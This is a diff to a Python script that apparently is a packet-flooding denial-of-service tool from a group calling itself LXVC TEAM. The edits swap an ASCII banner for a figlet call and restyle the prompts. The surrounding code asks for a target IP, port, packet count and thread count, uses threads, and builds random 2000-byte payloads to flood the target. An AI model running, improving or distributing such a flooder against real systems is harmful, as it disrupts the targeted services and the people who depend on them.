@@ -7,24 +7,18 @@ import socket
 import threading
 
 os.system("clear")
-print("""\x1b[1;92m
- _                    _____
-| |   __  ____   ____|_   _|__  __ _ _ __ ___
-| |   \ \/ /\ \ / / __|| |/ _ \/ _` | '_ ` _ \
-| |___ >  <  \ V / (__ | |  __/ (_| | | | | | |
-|_____/_/\_\  \_/ \___||_|\___|\__,_|_| |_| |_|
- """)
+os.system("figlet LxvcTeam")
 print("↪ TOOLS INFORMATION ↩")
 print("↪ CREATOR : LXVC TEAM")
 print("↪ VERSION : V3↩")
 print("↪ COMMUNITY SERVER ↩")
 print("↪ https://discord.gg/sjyfrpVJ↩")
 
-ip = str(input(" IP :"))
-port = int(input(" Port :"))
-choice = str(input(" UDP Only (y/n)):"))
-times = int(input(" Packet :"))
-threads = int(input(" Thread :"))
+ip = str(input("↪ IP :"))
+port = int(input("↪ Port :"))
+choice = str(input("↪ UDP Only (y/n)):"))
+times = int(input("↪Packet :"))
+threads = int(input(" ↪Thread :"))
 os.system("clear")
 def run():
 	data = random._urandom(2000)
